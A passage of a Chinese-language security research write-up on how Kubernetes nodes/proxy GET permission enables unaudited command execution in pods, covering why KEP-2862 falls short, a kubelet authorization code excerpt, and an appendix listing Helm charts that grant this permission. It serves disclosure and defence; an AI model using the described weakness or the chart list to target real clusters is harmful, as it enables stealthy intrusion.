1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/pods</span></code><section><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/runningpods</span></code></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Pod 列表与状态</span></section></td></tr></tbody></table>  
  
如果 Kubernetes 实现了这个方案，它并不会修复根本问题。虽然 KEP-2862 无疑是朝着正确方向迈出的一步，但它没有解决根本问题，原因如下：  
1. 1. KEP-2862 目前处于   
Beta[49]  
 阶段，**并非**  
正式可用，因此“  
仅推荐用于非业务关键用途，因为后续版本可能存在不兼容更改。[50]  
” 您必须在 Kubelet 上使用 --feature-gates=KubeletFineGrainedAuthz=true  
 明确启用它。  
  
1. 2. 它没有为 /attach  
、/exec  
、/run  
 或 /portforward  
 提供替代方案。从安全角度来看，这是有问题的，因为任何需要这些操作的工作负载仍然必须使用 nodes/proxy  
。  
  
> **注意**  
  
有趣的是，KEP-2862 中完全未提及 /portforward  
。  
  
1. 3. 最后，KEP-2862 没有修复在授权 nodes/proxy GET  
 时代码中的根本性缺陷。  
  
重申一遍，问题在于连接协议（例如 WebSockets）和 RBAC 动词（GET  
 与 CREATE  
）之间的不匹配。Kubelet 基于 WebSocket 连接建立期间发送的 HTTP GET  
 进行授权决策，而不是根据实际执行的操作。  
### 10.4 子资源映射已经存在  
> “若要针对此特定路径进行限制，需要同时修改 kubelet（将 /exec 路径作为特例处理）和 kube-apiserver（对 /exec 路径添加二次路径检查）的授权机制……我们认为，实现并协调这样的双重授权逻辑是脆弱的、架构不正确的，并且可能是不完整的。”  
  
  
Kubelet 的   
auth.go[51]  
 已经将特定路径映射到了专门的子资源：  
```
    switch {    case isSubpath(requestPath, statsPath):        subresources = append(subresources, "stats")    case isSubpath(requestPath, metricsPath):        subresources = append(subresources, "metrics")    case isSubpath(requestPath, logsPath):        // "log" to match other log subresources (pods/log, etc)        subresources = append(subresources, "log")    case isSubpath(requestPath, checkpointPath):        subresources = append(subresources, "checkpoint")    case isSubpath(requestPath, statusz.DefaultStatuszPath):        subresources = append(subresources, "statusz")    case isSubpath(requestPath, flagz.DefaultFlagzPath):        subresources = append(subresources, "configz")    default:        subresources = append(subresources, "proxy")    }
```  
  
API Server 已经执行了二次授权。正如第一点所示，针对 pods/exec  
 的修复方案在   
authorize.go[36]  
 中添加了一个二次授权检查，无论 HTTP 方法是什么，都会验证 CREATE 权限。提议的修复方案的两部分都遵循了已经存在的模式。  
## 十一、总结与思考  
  
Kubernetes 是全球大部分云基础设施的支柱。这种能够在集群每个 Pod 中执行代码且不生成审计日志的意外能力，其安全影响是一个巨大的风险，使得许多 Kubernetes 集群处于脆弱状态。  
  
如果您正在运行 Kubernetes，值得检查您的集群，以确定这是否是您应该关注的风险。  
  
这种情况让我想起了 Active Directory 中的 Kerberoasting，那是一个“符合预期”的架构设计，但攻击者十多年来一直在利用它。我希望这个问题能得到修复，这样我未来的评估中就无法利用它了。  
  
这是一个耗时巨大的项目，占用了过去几个月里无数个夜晚和周末。我要感谢以下各位花时间审阅这项研究，与我一同深入探索 Kubernetes 源代码，并在发表前帮助我完善它。  
- •   
Iain Smart[52]  
  
- •   
Rory McCune[53]  
  
- •   
Jay Beale[54]  
  
- •   
Andreas Kellas[55]  
  
- •   
Maria Khodak[56]  
  
- •   
Mark Manning[57]  
  
- •   
CJ Cullen[58]  
  
- •   
Julien Boeuf[59]  
  
- •   
Ayub Yusuf[60]  
  
## 附录：受影响的 Helm Charts  
  
以下 69 个 Helm Charts 被发现在某种程度上使用了 nodes/proxy  
 权限。每个链接都指向您可自行下载和检查的 Chart。  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">Chart</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">资源</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">动词</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">链接</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">aws/appmesh-prometheus:1.0.3</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://aws.github.io/eks-charts/appmesh-prometheus-1.0.3.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">aws/appmesh-spire-agent:1.0.7</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://aws.github.io/eks-charts/appmesh-spire-agent-1.0.7.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">aws/aws-cloudwatch-metrics:0.0.11</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://aws.github.io/eks-charts/aws-cloudwatch-metrics-0.0.11.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">aws/aws-for-fluent-bit:0.1.35</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://aws.github.io/eks-charts/aws-for-fluent-bit-0.1.35.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">bitnami/wavefront:4.4.3</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.bitnami.com/bitnami/wavefront-4.4.3.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">choerodon/kube-prometheus:9.3.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://openchart.choerodon.com.cn/choerodon/c7n/charts/kube-prometheus-9.3.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">choerodon/prometheus-operator:9.3.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://openchart.choerodon.com.cn/choerodon/c7n/charts/prometheus-operator-9.3.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">choerodon/promtail:0.23.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://openchart.choerodon.com.cn/choerodon/c7n/charts/promtail-0.23.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">cilium/cilium:1.19.0-rc.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.cilium.io/cilium-1.19.0-rc.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">dandydev-charts/grafana-agent:0.19.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH, GET,GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/DandyDeveloper/charts/releases/download/grafana-agent-0.19.2/grafana-agent-0.19.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">datadog/datadog:3.161.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/DataDog/helm-charts/releases/download/datadog-3.161.2/datadog-3.161.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">datadog/datadog-operator:2.18.0-dev.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/DataDog/helm-charts/releases/download/datadog-operator-2.18.0-dev.1/datadog-operator-2.18.0-dev.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">elastic/elastic-agent:9.2.4</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.elastic.co/helm/elastic-agent/elastic-agent-9.2.4.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">flagger/flagger:1.42.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://flagger.app/flagger-1.42.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">fluent/fluent-bit:0.55.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/fluent/helm-charts/releases/download/fluent-bit-0.55.0/fluent-bit-0.55.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">fluent/fluent-bit-collector:1.0.0-beta.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: 